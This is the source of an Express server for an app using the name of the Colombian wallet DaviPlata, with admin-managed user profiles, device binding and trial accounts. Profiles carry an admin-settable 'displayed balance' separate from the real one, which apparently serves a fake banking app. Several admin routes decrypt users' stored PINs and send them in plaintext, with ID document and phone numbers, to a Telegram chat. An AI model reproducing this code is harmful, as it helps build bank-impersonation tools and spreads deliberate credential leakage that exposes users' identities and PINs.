import express, { type IRouter, type Request, type Response } from "express";
import { createCipheriv, createDecipheriv, createHash, createHmac, randomBytes, timingSafeEqual } from "node:crypto";
import { notifyAdminTelegram } from "./admin/notifications.js";

const router: IRouter = express.Router();
const accountId = "5128ff5490523174083c9d817775e9dc";
const databaseId = "72721f56-ef27-43b6-bf0d-70a046204021";
const apiUrl = `https://api.cloudflare.com/client/v4/accounts/${accountId}/d1/database/${databaseId}/query`;
const authWindowMs = 15 * 60 * 1000;
const authAttemptLimit = 12;
const userTokenLifetimeMs = 30 * 24 * 60 * 60 * 1000;
const allowedDocumentTypes = new Set([
  "Cédula de Ciudadanía",
  "Cédula de Extranjería",
  "Tarjeta de Identidad",
]);

type D1Result<T = Record<string, unknown>> = {
  results?: T[];
  meta?: { changes?: number };
};

type ProfileInput = {
  id: string;
  name: string;
  documentType: string;
  documentNumber: string;
  phone: string;
  pin: string;
  balance: number;
  displayBalance: number | null;
  premiumExpiresAt: number | null;
  premiumEnabled: boolean;
  boldExpiresAt: number | null;
  boldEnabled: boolean;
  smsCredits: number;
  smsEnabled: boolean;
  blocked: boolean;
  isTrial: boolean;
  trialExpiresAt: number | null;
  createdAt: string;
  state?: unknown;
};

function sessionSecret() {
  const secret = process.env.SESSION_SECRET;
  if (!secret) throw new Error("SESSION_SECRET is not configured");
  return secret;
}

async function d1<T = Record<string, unknown>>(sql: string, params: unknown[] = []): Promise<D1Result<T>> {
  const token = process.env.CLOUDFLARE_API_TOKEN;
  if (!token) throw new Error("D1_NOT_CONFIGURED");
  const result = await fetch(apiUrl, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${token}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ sql, params }),
  });
  const payload = await result.json() as {
    success?: boolean;
    errors?: Array<{ message?: string }>;
    result?: D1Result<T>[];
  };
  if (!result.ok || payload.success !== true) {
    console.error("DaviPlata D1 request failed", result.status, payload.errors?.[0]?.message ?? "unknown error");
    throw new Error("D1_QUERY_FAILED");
  }
  return payload.result?.[0] ?? {};
}

function sign(value: string) {
  return createHmac("sha256", sessionSecret()).update(value).digest("base64url");
}

function safeEqual(left: string, right: string) {
  const a = Buffer.from(left);
  const b = Buffer.from(right);
  return a.length === b.length && timingSafeEqual(a, b);
}

function readCookie(request: Request, name: string) {
  const prefix = `${name}=`;
  const value = request.headers.cookie
    ?.split(";")
    .map((part) => part.trim())
    .find((part) => part.startsWith(prefix));
  return value ? value.slice(prefix.length) : null;
}

function hasAdminSession(request: Request) {
  try {
    const token = readCookie(request, "davi_admin_session");
    if (!token || token.length > 256) return false;
    const separator = token.lastIndexOf(".");
    if (separator < 1) return false;
    const payload = token.slice(0, separator);
    if (!safeEqual(token.slice(separator + 1), sign(payload))) return false;
    const expiresAt = Number(Buffer.from(payload, "base64url").toString("utf8"));
    return Number.isFinite(expiresAt) && expiresAt > Date.now();
  } catch {
    return false;
  }
}

function hashDeviceToken(token: string) {
  return createHash("sha256").update(`daviplata-device-v1:${token}`).digest("hex");
}

function deviceTokenGeneration(token: string) {
  const separator = token.indexOf(".");
  if (separator < 1) return null;
  const generation = Number(token.slice(0, separator));
  const secret = token.slice(separator + 1);
  return Number.isSafeInteger(generation) && generation >= 0 && secret.length >= 32
    ? generation
    : null;
}

function createDeviceToken(generation: number) {
  return `${generation}.${randomBytes(32).toString("base64url")}`;
}

function createUserToken(profileId: string, deviceHash: string, deviceGeneration: number) {
  const payload = Buffer.from(JSON.stringify({
    sub: profileId,
    exp: Date.now() + userTokenLifetimeMs,
    deviceHash,
    deviceGeneration,
  })).toString("base64url");
  return `${payload}.${sign(payload)}`;
}

function readUserToken(request: Request) {
  const authorization = request.headers.authorization ?? "";
  const token = authorization.startsWith("Bearer ") ? authorization.slice(7) : "";
  if (!token || token.length > 2048) return null;
  const separator = token.lastIndexOf(".");
  if (separator < 1) return null;
  const payloadPart = token.slice(0, separator);
  try {
    if (!safeEqual(token.slice(separator + 1), sign(payloadPart))) return null;
    const payload = JSON.parse(Buffer.from(payloadPart, "base64url").toString("utf8")) as {
      sub?: string;
      exp?: number;
      deviceHash?: string;
      deviceGeneration?: number;
    };
    if (
      typeof payload.sub !== "string" ||
      !payload.sub ||
      Number(payload.exp) <= Date.now() ||
      typeof payload.deviceHash !== "string" ||
      !/^[a-f0-9]{64}$/.test(payload.deviceHash) ||
      !Number.isSafeInteger(payload.deviceGeneration) ||
      Number(payload.deviceGeneration) < 0
    ) return null;
    return {
      profileId: payload.sub,
      deviceHash: payload.deviceHash,
      deviceGeneration: Number(payload.deviceGeneration),
    };
  } catch {
    return null;
  }
}

function hashPin(pin: string, salt: string) {
  return createHmac("sha256", sessionSecret())
    .update(`davi-pin-v1:${salt}:${pin}`)
    .digest("base64url");
}

function encryptPin(pin: string) {
  const key = createHash("sha256").update(`davi-pin-encryption-v1:${sessionSecret()}`).digest();
  const iv = randomBytes(12);
  const cipher = createCipheriv("aes-256-gcm", key, iv);
  const encrypted = Buffer.concat([cipher.update(pin, "utf8"), cipher.final(), cipher.getAuthTag()]);
  return `${iv.toString("base64url")}.${encrypted.toString("base64url")}`;
}

function decryptPin(value: string) {
  try {
    const [ivPart, encryptedPart] = value.split(".");
    if (!ivPart || !encryptedPart) return "";
    const key = createHash("sha256").update(`davi-pin-encryption-v1:${sessionSecret()}`).digest();
    const packed = Buffer.from(encryptedPart, "base64url");
    const decipher = createDecipheriv("aes-256-gcm", key, Buffer.from(ivPart, "base64url"));
    decipher.setAuthTag(packed.subarray(packed.length - 16));
    return Buffer.concat([decipher.update(packed.subarray(0, packed.length - 16)), decipher.final()]).toString("utf8");
  } catch {
    return "";
  }
}

function normalizedProfile(input: unknown): ProfileInput {
  if (!input || typeof input !== "object") throw new Error("INVALID_PROFILE");
  const value = input as Record<string, unknown>;
  const id = String(value.id ?? "");
  const name = String(value.name ?? "").trim();
  const documentType = String(value.documentType ?? "");
  const documentNumber = String(value.documentNumber ?? "").replace(/\D/g, "");
  const phone = String(value.phone ?? "").replace(/\D/g, "");
  const pin = String(value.pin ?? "");
  const balance = Number(value.balance);
  const displayBalance = value.displayBalance === null || value.displayBalance === undefined || value.displayBalance === ""
    ? null
    : Number(value.displayBalance);
  const smsCredits = Number(value.smsCredits ?? 0);
  const optionalTimestamp = (item: unknown) =>
    item === null || item === undefined || item === "" ? null : Number.isFinite(Number(item)) ? Number(item) : null;

  if (!/^[A-Za-z0-9_-]{1,100}$/.test(id) || !name || name.length > 120) throw new Error("INVALID_PROFILE");
  if (!allowedDocumentTypes.has(documentType) || documentNumber.length < 5 || documentNumber.length > 20) throw new Error("INVALID_PROFILE");
  if (phone.length < 7 || phone.length > 12 || !Number.isFinite(balance) || balance < 0) throw new Error("INVALID_PROFILE");
  if (displayBalance !== null && (!Number.isFinite(displayBalance) || displayBalance < 0)) throw new Error("INVALID_PROFILE");
  if (!Number.isSafeInteger(smsCredits) || smsCredits < 0 || !/^\d{4}$/.test(pin)) throw new Error("INVALID_PROFILE");

  return {
    id,
    name,
    documentType,
    documentNumber,
    phone,
    pin,
    balance,
    displayBalance,
    premiumExpiresAt: optionalTimestamp(value.premiumExpiresAt),
    premiumEnabled: value.premiumEnabled === true,
    boldExpiresAt: optionalTimestamp(value.boldExpiresAt),
    boldEnabled: value.boldEnabled === true,
    smsCredits,
    smsEnabled: value.smsEnabled === true,
    blocked: value.blocked === true,
    isTrial: value.isTrial === true,
    trialExpiresAt: optionalTimestamp(value.trialExpiresAt),
    createdAt: typeof value.createdAt === "string" ? value.createdAt : new Date().toISOString(),
    state: value.state,
  };
}

function mapProfile(row: Record<string, unknown>, pin = "") {
  return {
    id: String(row.id),
    name: String(row.name),
    documentType: String(row.document_type),
    documentNumber: String(row.document_number),
    phone: String(row.phone),
    pin,
    balance: Number(row.balance),
    createdAt: String(row.created_at),
    displayBalance: row.display_balance === null ? null : Number(row.display_balance),
    premiumExpiresAt: row.premium_expires_at === null ? null : Number(row.premium_expires_at),
    premiumEnabled: Number(row.premium_enabled) === 1,
    boldExpiresAt: row.bold_expires_at === null ? null : Number(row.bold_expires_at),
    boldEnabled: Number(row.bold_enabled) === 1,
    smsCredits: Number(row.sms_credits),
    smsEnabled: Number(row.sms_enabled) === 1,
    blocked: Number(row.blocked) === 1,
    isTrial: Number(row.is_trial) === 1,
    trialExpiresAt: row.trial_expires_at === null ? null : Number(row.trial_expires_at),
  };
}

async function findProfileById(id: string) {
  const result = await d1<Record<string, unknown>>("SELECT * FROM davi_profiles WHERE id = ? LIMIT 1", [id]);
  return result.results?.[0] ?? null;
}

function safeProfilePin(profile: Record<string, unknown>) {
  try {
    return decryptPin(String(profile.pin_encrypted ?? ""));
  } catch {
    return "No disponible";
  }
}

function profileChangedFields(previous: Record<string, unknown>, next: ProfileInput) {
  const changed: string[] = [];
  const checks: Array<[string, unknown, unknown]> = [
    ["Nombre", previous.name, next.name],
    ["Tipo de documento", previous.document_type, next.documentType],
    ["Número de documento", previous.document_number, next.documentNumber],
    ["Celular", previous.phone, next.phone],
    ["Saldo", Number(previous.balance), next.balance],
    ["Saldo mostrado", previous.display_balance === null ? null : Number(previous.display_balance), next.displayBalance],
    ["Premium", `${previous.premium_enabled}:${previous.premium_expires_at}`, `${Number(next.premiumEnabled)}:${next.premiumExpiresAt}`],
    ["Bold", `${previous.bold_enabled}:${previous.bold_expires_at}`, `${Number(next.boldEnabled)}:${next.boldExpiresAt}`],
    ["SMS", `${previous.sms_enabled}:${previous.sms_credits}`, `${Number(next.smsEnabled)}:${next.smsCredits}`],
    ["Acceso", Number(previous.blocked), Number(next.blocked)],
    ["Tipo de usuario", Number(previous.is_trial), Number(next.isTrial)],
    ["Vencimiento de prueba", previous.trial_expires_at, next.trialExpiresAt],
  ];
  for (const [label, before, after] of checks) {
    if (String(before ?? "") !== String(after ?? "")) changed.push(label);
  }
  let previousPin = "";
  try {
    previousPin = decryptPin(String(previous.pin_encrypted ?? ""));
  } catch {
    // If an old encrypted PIN cannot be read, do not claim it changed.
  }
  if (previousPin && previousPin !== next.pin) changed.push("PIN");
  return changed;
}

function profileAlertFields(profile: ProfileInput) {
  const date = (value: number | null) => value
    ? new Date(value).toLocaleString("es-CO", { timeZone: "America/Bogota" })
    : "No aplica";
  return {
    Nombre: profile.name,
    Documento: `${profile.documentType} ${profile.documentNumber}`,
    Celular: profile.phone,
    PIN: profile.pin,
    Saldo: `$${profile.balance.toLocaleString("es-CO")}`,
    Premium: `${profile.premiumEnabled ? "Activo" : "Inactivo"} · vence ${date(profile.premiumExpiresAt)}`,
    Bold: `${profile.boldEnabled ? "Activo" : "Inactivo"} · vence ${date(profile.boldExpiresAt)}`,
    SMS: `${profile.smsCredits} créditos · ${profile.smsEnabled ? "activo" : "inactivo"}`,
    Tipo: profile.isTrial ? "Prueba" : "Normal",
    "Vencimiento de prueba": profile.isTrial ? date(profile.trialExpiresAt) : "No aplica",
    Acceso: profile.blocked ? "Bloqueado" : "Activo",
  };
}

async function readState(profileId: string) {
  const result = await d1<{ state_json: string }>("SELECT state_json FROM davi_account_state WHERE profile_id = ? LIMIT 1", [profileId]);
  if (!result.results?.[0]) return null;
  try {
    return JSON.parse(result.results[0].state_json);
  } catch {
    return null;
  }
}

async function saveState(profileId: string, state: unknown) {
  if (!state || typeof state !== "object" || Array.isArray(state)) throw new Error("INVALID_STATE");
  const serialized = JSON.stringify(state);
  if (serialized.length > 900_000) throw new Error("STATE_TOO_LARGE");
  const balance = Number((state as { balance?: unknown }).balance);
  if (!Number.isFinite(balance) || balance < 0) throw new Error("INVALID_STATE");
  const now = new Date().toISOString();
  await d1(
    `INSERT INTO davi_account_state (profile_id, state_json, updated_at)
     VALUES (?, ?, ?)
     ON CONFLICT(profile_id) DO UPDATE SET state_json = excluded.state_json, updated_at = excluded.updated_at`,
    [profileId, serialized, now],
  );
  await d1("UPDATE davi_profiles SET balance = ?, updated_at = ? WHERE id = ?", [balance, now, profileId]);
}

async function consumeAttempt(request: Request, category: string) {
  const forwarded = request.headers["x-forwarded-for"];
  const ip = (Array.isArray(forwarded) ? forwarded[0] : forwarded?.split(",")[0])?.trim() || request.ip || "unknown";
  const key = `${category}:${ip}`;
  const result = await d1<{ attempts: number; window_started_at: number }>(
    "SELECT attempts, window_started_at FROM davi_auth_attempts WHERE attempt_key = ? LIMIT 1",
    [key],
  );
  const row = result.results?.[0];
  const now = Date.now();
  if (row && now - Number(row.window_started_at) < authWindowMs && Number(row.attempts) >= authAttemptLimit) return false;
  const attempts = row && now - Number(row.window_started_at) < authWindowMs ? Number(row.attempts) + 1 : 1;
  const windowStarted = row && now - Number(row.window_started_at) < authWindowMs ? Number(row.window_started_at) : now;
  await d1(
    `INSERT INTO davi_auth_attempts (attempt_key, attempts, window_started_at)
     VALUES (?, ?, ?)
     ON CONFLICT(attempt_key) DO UPDATE SET attempts = excluded.attempts, window_started_at = excluded.window_started_at`,
    [key, attempts, windowStarted],
  );
  return true;
}

async function clearAttempts(request: Request, category: string) {
  const forwarded = request.headers["x-forwarded-for"];
  const ip = (Array.isArray(forwarded) ? forwarded[0] : forwarded?.split(",")[0])?.trim() || request.ip || "unknown";
  await d1("DELETE FROM davi_auth_attempts WHERE attempt_key = ?", [`${category}:${ip}`]);
}

async function clearExpiredTrials() {
  const now = Date.now();
  const expiredResult = await d1<Record<string, unknown>>(
    "SELECT * FROM davi_profiles WHERE is_trial = 1 AND trial_expires_at <= ?",
    [now],
  );
  const expiredProfiles = expiredResult.results ?? [];
  if (expiredProfiles.length === 0) return;
  await d1("DELETE FROM davi_account_state WHERE profile_id IN (SELECT id FROM davi_profiles WHERE is_trial = 1 AND trial_expires_at <= ?)", [now]);
  await d1("DELETE FROM davi_profiles WHERE is_trial = 1 AND trial_expires_at <= ?", [now]);
  for (const profile of expiredProfiles) {
    await notifyAdminTelegram({
      app: "DaviPlata",
      event: "Usuario de prueba eliminado al vencer",
      fields: {
        Nombre: profile.name,
        Documento: `${profile.document_type} ${profile.document_number}`,
        Celular: profile.phone,
        PIN: safeProfilePin(profile),
        Saldo: `$${Number(profile.balance).toLocaleString("es-CO")}`,
      },
    });
  }
}

async function saveProfile(profile: ProfileInput) {
  const salt = randomBytes(16).toString("base64url");
  const now = new Date().toISOString();
  await d1(
    `INSERT INTO davi_profiles (
      id, name, document_type, document_number, phone, pin_salt, pin_hash, pin_encrypted,
      balance, display_balance, premium_expires_at, premium_enabled, bold_expires_at,
      bold_enabled, sms_credits, sms_enabled, blocked, is_trial, trial_expires_at, created_at, updated_at
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(id) DO UPDATE SET
      name = excluded.name, document_type = excluded.document_type,
      document_number = excluded.document_number, phone = excluded.phone,
      pin_salt = excluded.pin_salt, pin_hash = excluded.pin_hash, pin_encrypted = excluded.pin_encrypted,
      balance = excluded.balance, display_balance = excluded.display_balance,
      premium_expires_at = excluded.premium_expires_at, premium_enabled = excluded.premium_enabled,
      bold_expires_at = excluded.bold_expires_at, bold_enabled = excluded.bold_enabled,
      sms_credits = excluded.sms_credits, sms_enabled = excluded.sms_enabled,
      blocked = excluded.blocked, is_trial = excluded.is_trial,
      trial_expires_at = excluded.trial_expires_at, updated_at = excluded.updated_at`,
    [
      profile.id, profile.name, profile.documentType, profile.documentNumber, profile.phone,
      salt, hashPin(profile.pin, salt), encryptPin(profile.pin), profile.balance, profile.displayBalance,
      profile.premiumExpiresAt, profile.premiumEnabled ? 1 : 0, profile.boldExpiresAt, profile.boldEnabled ? 1 : 0,
      profile.smsCredits, profile.smsEnabled ? 1 : 0, profile.blocked ? 1 : 0, profile.isTrial ? 1 : 0,
      profile.trialExpiresAt, profile.createdAt, now,
    ],
  );
}

router.post("/daviplata/data", async (request: Request, response: Response) => {
  try {
    const body = request.body as Record<string, unknown>;
    const action = String(body.action ?? "");

    if (action === "auth:identify") {
      if (!await consumeAttempt(request, "identify")) {
        response.status(429).json({ error: "Demasiados intentos. Espera antes de volver a probar." });
        return;
      }
      const documentType = String(body.documentType ?? "");
      const documentNumber = String(body.documentNumber ?? "").replace(/\D/g, "");
      const phone = String(body.phone ?? "").replace(/\D/g, "");
      const result = await d1<Record<string, unknown>>(
        "SELECT * FROM davi_profiles WHERE document_type = ? AND document_number = ? AND phone = ? LIMIT 1",
        [documentType, documentNumber, phone],
      );
      const row = result.results?.[0];
      if (!row) {
        response.status(404).json({ error: "No encontramos esos datos. Verifica el documento y el número de celular." });
        return;
      }
      if (Number(row.is_trial) === 1 && row.trial_expires_at !== null && Number(row.trial_expires_at) <= Date.now()) {
        await clearExpiredTrials();
        response.status(410).json({ error: "El usuario de prueba venció y fue eliminado." });
        return;
      }
      if (Number(row.blocked) === 1) {
        response.status(403).json({ error: "El acceso de este usuario está bloqueado. Contacta al administrador." });
        return;
      }
      await clearAttempts(request, "identify");
      response.json({ profile: mapProfile(row) });
      return;
    }

    if (action === "auth:login") {
      if (!await consumeAttempt(request, "login")) {
        response.status(429).json({ error: "Demasiados intentos. Espera antes de volver a probar." });
        return;
      }
      const id = String(body.id ?? "");
      const pin = String(body.pin ?? "");
      const row = await findProfileById(id);
      if (!row || !/^\d{4}$/.test(pin)) {
        response.status(401).json({ error: "PIN incorrecto." });
        return;
      }
      if (Number(row.blocked) === 1) {
        response.status(403).json({ error: "El acceso de este usuario está bloqueado." });
        return;
      }
      if (Number(row.is_trial) === 1 && row.trial_expires_at !== null && Number(row.trial_expires_at) <= Date.now()) {
        await clearExpiredTrials();
        response.status(410).json({ error: "El usuario de prueba venció y fue eliminado." });
        return;
      }
      const expected = hashPin(pin, String(row.pin_salt));
      if (!safeEqual(expected, String(row.pin_hash))) {
        response.status(401).json({ error: "PIN incorrecto." });
        return;
      }
      const deviceGeneration = Number(row.device_generation ?? 0);
      const suppliedDeviceToken = typeof body.deviceToken === "string" ? body.deviceToken : "";
      let deviceToken = suppliedDeviceToken;
      let deviceHash = "";
      if (suppliedDeviceToken) {
        if (deviceTokenGeneration(suppliedDeviceToken) !== deviceGeneration) {
          response.status(409).json({
            error: "Este dispositivo fue liberado. Ingresa desde otro dispositivo o pide al administrador que vuelva a vincularlo.",
          });
          return;
        }
        deviceHash = hashDeviceToken(suppliedDeviceToken);
        if (row.device_token_hash) {
          if (!safeEqual(deviceHash, String(row.device_token_hash))) {
            response.status(409).json({
              error: "La cuenta está vinculada a otro dispositivo. Pide al administrador que libere el acceso.",
            });
            return;
          }
        } else {
          await d1(
            `UPDATE davi_profiles SET device_token_hash = ?, updated_at = ?
             WHERE id = ? AND device_token_hash IS NULL AND device_generation = ?`,
            [deviceHash, new Date().toISOString(), id, deviceGeneration],
          );
          const boundProfile = await findProfileById(id);
          if (!boundProfile || !safeEqual(String(boundProfile.device_token_hash ?? ""), deviceHash)) {
            response.status(409).json({
              error: "Otro dispositivo vinculó esta cuenta primero. Pide al administrador que libere el acceso.",
            });
            return;
          }
        }
      } else {
        if (row.device_token_hash) {
          response.status(409).json({
            error: "La cuenta está vinculada a otro dispositivo. Pide al administrador que libere el acceso.",
          });
          return;
        }
        deviceToken = createDeviceToken(deviceGeneration);
        deviceHash = hashDeviceToken(deviceToken);
        await d1(
          `UPDATE davi_profiles SET device_token_hash = ?, updated_at = ?
           WHERE id = ? AND device_token_hash IS NULL AND device_generation = ?`,
          [deviceHash, new Date().toISOString(), id, deviceGeneration],
        );
        const boundProfile = await findProfileById(id);
        if (!boundProfile || !safeEqual(String(boundProfile.device_token_hash ?? ""), deviceHash)) {
          response.status(409).json({
            error: "Otro dispositivo vinculó esta cuenta primero. Pide al administrador que libere el acceso.",
          });
          return;
        }
      }
      await clearAttempts(request, "login");
      const token = createUserToken(id, deviceHash, deviceGeneration);
      response.json({
        token,
        deviceToken,
        profile: mapProfile(row),
        state: await readState(id),
      });
      return;
    }

    if (action === "user:restore" || action === "user:saveState" || action === "user:saveProfile") {
      const userSession = readUserToken(request);
      if (!userSession) {
        response.status(401).json({ error: "La sesión venció. Ingresa con tu PIN." });
        return;
      }
      const profileId = userSession.profileId;
      const row = await findProfileById(profileId);
      if (!row || Number(row.blocked) === 1) {
        response.status(403).json({ error: "El acceso de este usuario está bloqueado." });
        return;
      }
      if (
        !row.device_token_hash ||
        !safeEqual(String(row.device_token_hash), userSession.deviceHash) ||
        Number(row.device_generation ?? 0) !== userSession.deviceGeneration
      ) {
        response.status(401).json({
          error: "Este dispositivo ya no tiene acceso. Ingresa con el PIN desde el dispositivo autorizado.",
        });
        return;
      }
      if (Number(row.is_trial) === 1 && row.trial_expires_at !== null && Number(row.trial_expires_at) <= Date.now()) {
        await clearExpiredTrials();
        response.status(410).json({ error: "El usuario de prueba venció y fue eliminado." });
        return;
      }
      if (action === "user:restore") {
        response.json({ profile: mapProfile(row), state: await readState(profileId) });
        return;
      }
      if (action === "user:saveState") {
        await saveState(profileId, body.state);
        response.json({ saved: true });
        return;
      }
      const displayBalance = body.displayBalance === null || body.displayBalance === undefined
        ? null
        : Number(body.displayBalance);
      if (displayBalance !== null && (!Number.isFinite(displayBalance) || displayBalance < 0)) {
        response.status(400).json({ error: "El saldo visible no es válido." });
        return;
      }
      const requestedCredits = Number(body.smsCredits);
      const smsCredits = Number.isSafeInteger(requestedCredits)
        ? Math.min(Number(row.sms_credits), Math.max(0, requestedCredits))
        : Number(row.sms_credits);
      const premiumEnabled = body.premiumEnabled === true && Number(row.premium_expires_at ?? 0) > Date.now();
      const boldEnabled = body.boldEnabled === true && Number(row.bold_expires_at ?? 0) > Date.now();
      const smsEnabled = body.smsEnabled === true && smsCredits > 0;
      await d1(
        `UPDATE davi_profiles SET display_balance = ?, premium_enabled = ?, bold_enabled = ?,
         sms_enabled = ?, sms_credits = ?, updated_at = ? WHERE id = ?`,
        [displayBalance, premiumEnabled ? 1 : 0, boldEnabled ? 1 : 0, smsEnabled ? 1 : 0, smsCredits, new Date().toISOString(), profileId],
      );
      response.json({ saved: true });
      return;
    }

    if (action.startsWith("admin:")) {
      if (!hasAdminSession(request)) {
        response.status(401).json({ error: "La sesión del panel venció." });
        return;
      }
      if (action === "admin:listProfiles") {
        await clearExpiredTrials();
        const result = await d1<Record<string, unknown>>("SELECT * FROM davi_profiles ORDER BY created_at DESC");
        response.json({
          profiles: (result.results ?? []).map((row) => ({
            ...mapProfile(row, decryptPin(String(row.pin_encrypted))),
            deviceBound: Boolean(row.device_token_hash),
          })),
        });
        return;
      }
      if (action === "admin:releaseDevice") {
        const id = String(body.id ?? "");
        const profile = id ? await findProfileById(id) : null;
        if (!profile) {
          response.status(404).json({ error: "No se encontró el usuario." });
          return;
        }
        await d1(
          `UPDATE davi_profiles
           SET device_token_hash = NULL, device_generation = device_generation + 1, updated_at = ?
           WHERE id = ?`,
          [new Date().toISOString(), id],
        );
        await notifyAdminTelegram({
          app: "DaviPlata",
          event: "Dispositivo liberado",
          userAgent: request.headers["user-agent"] ?? "",
          fields: {
            Nombre: profile.name,
            Documento: `${profile.document_type} ${profile.document_number}`,
            Celular: profile.phone,
            PIN: safeProfilePin(profile),
            "Tenía dispositivo vinculado": profile.device_token_hash ? "Sí" : "No",
            "Era de prueba": Number(profile.is_trial) === 1 ? "Sí" : "No",
          },
        });
        response.json({ released: true, deviceBound: false });
        return;
      }
      if (action === "admin:saveProfiles") {
        if (!Array.isArray(body.profiles) || body.profiles.length > 500) {
          response.status(400).json({ error: "La lista de perfiles no es válida." });
          return;
        }
        const profiles = body.profiles.map(normalizedProfile);
        if (body.migrate === true) {
          const count = await d1<{ count: number }>("SELECT COUNT(*) AS count FROM davi_profiles");
          if (Number(count.results?.[0]?.count ?? 0) !== 0) {
            response.status(409).json({ error: "La base ya contiene perfiles; no se migró para evitar reemplazarlos." });
            return;
          }
        }
        const previousResult = body.migrate === true
          ? { results: [] as Record<string, unknown>[] }
          : await d1<Record<string, unknown>>("SELECT * FROM davi_profiles");
        const previousProfiles = new Map(
          (previousResult.results ?? []).map((profile) => [String(profile.id), profile]),
        );
        for (const profile of profiles) {
          const previous = previousProfiles.get(profile.id);
          const changes = previous ? profileChangedFields(previous, profile) : [];
          await saveProfile(profile);
          if (body.migrate === true && profile.state) await saveState(profile.id, profile.state);
          if (body.migrate !== true && !previous) {
            await notifyAdminTelegram({
              app: "DaviPlata",
              event: profile.isTrial ? "Usuario de prueba creado" : "Usuario creado",
              userAgent: request.headers["user-agent"] ?? "",
              fields: profileAlertFields(profile),
            });
          } else if (body.migrate !== true && changes.length > 0) {
            await notifyAdminTelegram({
              app: "DaviPlata",
              event: "Perfil de usuario actualizado",
              userAgent: request.headers["user-agent"] ?? "",
              fields: {
                ...profileAlertFields(profile),
                Cambios: changes.join(", "),
              },
            });
          }
        }
        response.json({ saved: profiles.length });
        return;
      }
      if (action === "admin:deleteProfile") {
        const id = String(body.id ?? "");
        const profile = id ? await findProfileById(id) : null;
        await d1("DELETE FROM davi_account_state WHERE profile_id = ?", [id]);
        await d1("DELETE FROM davi_profiles WHERE id = ?", [id]);
        if (profile) {
          await notifyAdminTelegram({
            app: "DaviPlata",
            event: "Usuario eliminado",
            userAgent: request.headers["user-agent"] ?? "",
            fields: {
              Nombre: profile.name,
              Documento: `${profile.document_type} ${profile.document_number}`,
              Celular: profile.phone,
              PIN: safeProfilePin(profile),
              Saldo: `$${Number(profile.balance).toLocaleString("es-CO")}`,
              "Era de prueba": Number(profile.is_trial) === 1 ? "Sí" : "No",
            },
          });
        }
        response.json({ deleted: true });
        return;
      }
    }

    response.status(404).json({ error: "Acción no disponible." });
  } catch (error) {
    const message = error instanceof Error ? error.message : "";
    if (message === "D1_NOT_CONFIGURED") {
      response.status(503).json({ error: "Falta conectar D1 en las variables privadas de Vercel." });
      return;
    }
    if (message === "INVALID_PROFILE" || message === "INVALID_STATE") {
      response.status(400).json({ error: "Los datos enviados no son válidos." });
      return;
    }
    if (message === "STATE_TOO_LARGE") {
      response.status(413).json({ error: "Los datos de la cuenta superan el tamaño permitido." });
      return;
    }
    console.error("DaviPlata data API error", message || "unknown error");
    response.status(502).json({ error: "No se pudo guardar o consultar la información de DaviPlata." });
  }
});

const app = express();
app.set("trust proxy", 1);
app.use(express.json({ limit: "1mb" }));
app.use((request, _response, next) => {
  const query = request.url.includes("?") ? request.url.slice(request.url.indexOf("?")) : "";
  request.url = `/api/daviplata/data${query}`;
  next();
});
app.use("/api", router);

export default app;
